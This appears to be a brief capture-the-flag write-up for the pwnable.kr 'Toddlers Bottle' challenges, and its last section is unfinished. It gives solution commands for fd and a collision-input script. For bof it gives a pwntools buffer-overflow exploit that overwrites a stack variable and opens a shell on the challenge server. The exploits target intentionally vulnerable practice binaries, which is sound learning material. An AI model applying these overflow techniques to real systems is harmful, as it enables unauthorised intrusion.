# [pwnable.kr] Toddlers Bottle


<!--more-->

## fd

```bash
echo LETMEWIN | ./fd 4660
```

## collision

```python
piece = hex((0x21DD09EC + pow(2, 32)) // 5)[2:]
rev_piece = ''
for i in range(len(piece) - 2, -1, -2):
    rev_piece += piece[i:i+2]
print(bytes.fromhex(rev_piece))
```

```bash
./col "`python -c "print('\xfc\x01\xf99' * 5)"`"
```

## bof

```python
from pwn import *

input = b'A' * 0x2C + b'B' * 0x8 + p32(0xCAFEBABE)
shell = remote('pwnable.kr', 9000)
shell.send(input)
shell.interactive()
```

```bash
cat flag
```

## flag

[This posts is currently being updated...]

